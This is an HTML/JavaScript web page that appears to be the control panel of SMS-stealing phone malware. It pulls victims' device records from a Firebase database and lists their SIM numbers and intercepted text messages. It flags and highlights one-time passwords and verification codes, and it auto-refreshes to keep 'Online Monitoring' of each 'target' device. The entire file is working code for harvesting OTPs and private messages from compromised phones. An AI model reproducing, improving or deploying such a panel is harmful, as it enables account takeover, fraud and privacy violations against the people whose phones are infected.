<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Device SMS · FALCON01</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0a0e14; color: #e6edf3; padding: 16px; min-height: 100vh; }
        .container { max-width: 900px; margin: 0 auto; }
        .header { display: flex; justify-content: space-between; align-items: center; padding: 12px 20px; background: #161b22; border-radius: 12px; border: 1px solid #30363d; margin-bottom: 16px; gap: 10px; flex-wrap: wrap; }
        .header-left { display: flex; align-items: center; gap: 10px; }
        .back-btn { background: transparent; color: #58a6ff; border: 1px solid #30363d; padding: 6px 14px; border-radius: 6px; cursor: pointer; font-size: 13px; }
        .back-btn:hover { background: #1c2333; border-color: #58a6ff; }
        .device-title { font-size: 18px; font-weight: 600; }
        .device-subtitle { font-size: 13px; color: #8b949e; }
        .device-info { background: #161b22; border: 1px solid #30363d; border-radius: 12px; padding: 16px 20px; margin-bottom: 16px; display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 12px; }
        .info-item .label { font-size: 10px; color: #8b949e; text-transform: uppercase; }
        .info-item .value { font-size: 14px; font-weight: 500; margin-top: 2px; }
        .number-chip { background: #1c2333; padding: 2px 10px; border-radius: 10px; font-size: 13px; font-family: monospace; color: #58a6ff; border: 1px solid #30363d; display: inline-flex; align-items: center; gap: 6px; }
        .copy-chip { background: transparent; border: none; color: #8b949e; cursor: pointer; }
        .copy-chip:hover { color: #f0f6fc; }
        .sms-list { display: flex; flex-direction: column; gap: 8px; }
        .sms-item { background: #161b22; border: 1px solid #30363d; border-radius: 10px; padding: 14px 16px; }
        .sms-item.otp-alert { border-left: 4px solid #db8e2f; background: linear-gradient(145deg, #1f1b16, #161b22); }
        .otp-badge { background: #db8e2f; color: #0a0e14; font-size: 10px; padding: 1px 6px; border-radius: 4px; font-weight: bold; }
        .sms-header { display: flex; justify-content: space-between; margin-bottom: 6px; font-size: 13px; }
        .sms-sender { font-weight: 600; color: #58a6ff; display: flex; align-items: center; gap: 6px; }
        .sms-time { color: #8b949e; font-size: 11px; }
        .sms-message { font-size: 14px; line-height: 1.5; color: #e6edf3; white-space: pre-wrap; word-break: break-word; }
        .otp-highlighter { background: rgba(219, 142, 47, 0.2); color: #f0f6fc; border-bottom: 2px dashed #db8e2f; padding: 0 4px; font-family: monospace; font-weight: bold; font-size: 15px; }
        .loading, .no-sms { text-align: center; padding: 40px; color: #8b949e; }
        .spinner { display: inline-block; width: 32px; height: 32px; border: 3px solid #21262d; border-top: 3px solid #58a6ff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-bottom: 10px; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%) translateY(80px); background: #21262d; color: #f0f6fc; padding: 10px 24px; border-radius: 10px; font-size: 13px; border: 1px solid #30363d; opacity: 0; transition: all 0.3s; }
        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
    </style>
</head>
<body>
    <div class="container">
        <div id="toast" class="toast">📋 Copied!</div>
        <div class="header">
            <div class="header-left"><button class="back-btn" onclick="goBack()">← Back</button><div><div class="device-title" id="deviceTitle">Loading Info...</div><div class="device-subtitle" id="deviceSubtitle">—</div></div></div>
            <span class="back-btn" onclick="refreshDetail()" style="color:#3fb950;border-color:#238636;">⟳ Refresh</span>
        </div>
        <div class="device-info">
            <div class="info-item"><span class="label">Hardware ID</span><div class="value" id="infoId" style="font-family:monospace; font-size:11px; color:#8b949e;">—</div></div>
            <div class="info-item"><span class="label">Discovered Sim Profile</span><div class="value" id="infoNumbers">—</div></div>
            <div class="info-item"><span class="label">Status</span><div class="value" id="infoStatus">—</div></div>
        </div>
        <div id="smsListContainer">
            <div id="loadingSms" class="loading"><div class="spinner"></div><p>Fetching messages...</p></div>
            <div id="smsList" class="sms-list" style="display:none;"></div>
            <div id="noSms" class="no-sms" style="display:none;"><p>No text payloads discovered inside this device node.</p></div>
        </div>
    </div>
    <script>
        const DB_URL = 'https://fortydata-fee65-default-rtdb.firebaseio.com/admin/FALCON01/users.json';
        const MAX_SMS_TO_SHOW = 25;
        let deviceId = null; let messages = [];

        const $ = (s) => document.querySelector(s);
        const deviceTitle = $('#deviceTitle'); const deviceSubtitle = $('#deviceSubtitle');
        const infoId = $('#infoId'); const infoNumbers = $('#infoNumbers'); const infoStatus = $('#infoStatus');
        const smsList = $('#smsList'); const loadingSms = $('#loadingSms'); const noSms = $('#noSms'); const toast = $('#toast');

        function formatTimestamp(ts) {
            if (!ts) return '—';
            return new Date(ts).toLocaleString('en-IN', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit', hour12: true });
        }

        function extractNumbers(simInfo) {
            const nums = new Set(); if (!simInfo) return [];
            ['sim1', 'sim2'].forEach(slot => {
                if (simInfo[slot]?.number) {
                    let n = simInfo[slot].number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
                    if (n.length >= 10) nums.add(n);
                }
            });
            if (simInfo.number) {
                let n = simInfo.number.trim().replace(/[\s\-\(\)]/g, '').replace(/^\+?91/, '');
                if (n.length >= 10) nums.add(n);
            }
            return Array.from(nums);
        }

        function processSmsBody(msgText) {
            if (!msgText) return { text: '', isOtp: false };
            const otpRegex = /\b([0-9]{4,6})\b/;
            const verificationKeywords = /otp|verify|code|verification|secret|password|swiggy/i;
            let hasOtp = verificationKeywords.test(msgText) || otpRegex.test(msgText);
            let clearText = escapeHtml(msgText);
            if (hasOtp) clearText = clearText.replace(/\b([0-9]{4,6})\b/g, '<span class="otp-highlighter">$1</span>');
            return { text: clearText, isOtp: hasOtp };
        }

        function escapeHtml(str) {
            const div = document.createElement('div'); div.textContent = str; return div.innerHTML;
        }

        function showToast(msg) {
            toast.textContent = msg; toast.classList.add('show');
            clearTimeout(toast._timer); toast._timer = setTimeout(() => toast.classList.remove('show'), 1500);
        }

        function copyToClipboard(text) {
            navigator.clipboard?.writeText(text).then(() => { showToast('📋 Copied SIM: ' + text); })
            .catch(() => {
                const ta = document.createElement('textarea'); ta.value = text; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy'); ta.remove(); showToast('📋 Copied SIM: ' + text);
            });
        }

        async function loadDevice() {
            const params = new URLSearchParams(window.location.search); deviceId = params.get('id');
            if (!deviceId) { deviceTitle.textContent = '❌ Target ID parameter missing'; return; }
            try {
                const resp = await fetch(DB_URL, { headers: { 'Cache-Control': 'no-cache' } });
                const data = await resp.json(); const user = data[deviceId];
                if (!user) { deviceTitle.textContent = '❌ Profile missing'; loadingSms.style.display = 'none'; return; }
                
                messages = user.receivedSms ? Object.entries(user.receivedSms).map(([k, v]) => ({ id: k, ...v })) : [];
                messages.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
                
                const info = user.deviceInfo || {}; const numbers = extractNumbers(user.simInfo);
                deviceTitle.textContent = info.model || 'Generic Device'; deviceSubtitle.textContent = info.brand || 'Vendor Unassigned';
                infoId.textContent = deviceId;
                infoNumbers.innerHTML = numbers.map(n => `<span class="number-chip">${n} <button class="copy-chip" onclick="copyToClipboard('${n}')">📋</button></span>`).join('') || '<span style="color:#8b949e;">No SIM read</span>';
                infoStatus.textContent = user.online ? '🟢 Online Monitoring' : '⚪ Disconnected'; infoStatus.style.color = user.online ? '#3fb950' : '#8b949e';
                
                loadingSms.style.display = 'none';
                if (messages.length === 0) { smsList.style.display = 'none'; noSms.style.display = 'block'; return; }
                smsList.style.display = 'flex'; noSms.style.display = 'none';
                const fragment = document.createDocumentFragment();
                messages.slice(0, MAX_SMS_TO_SHOW).forEach(msg => {
                    const parsed = processSmsBody(msg.message); const item = document.createElement('div');
                    item.className = `sms-item ${parsed.isOtp ? 'otp-alert' : ''}`;
                    item.innerHTML = `<div class="sms-header"><span class="sms-sender">Anonymized: ${escapeHtml(msg.sender || 'Unknown')} ${parsed.isOtp ? '<span class="otp-badge">OTP</span>' : ''}</span><span class="sms-time">${formatTimestamp(msg.timestamp)}</span></div><div class="sms-message">${parsed.text}</div>`;
                    fragment.appendChild(item);
                });
                smsList.innerHTML = ''; smsList.appendChild(fragment);
            } catch (err) { deviceTitle.textContent = '❌ Execution Error'; loadingSms.style.display = 'none'; }
        }

        function goBack() { window.location.href = 'index.html'; }
        function refreshDetail() { loadDevice(); showToast('🔄 Refreshed dashboard fields'); }
        loadDevice();
        setInterval(() => { if (!document.hidden) loadDevice(); }, 10000);
    </script>
</body>
</html>
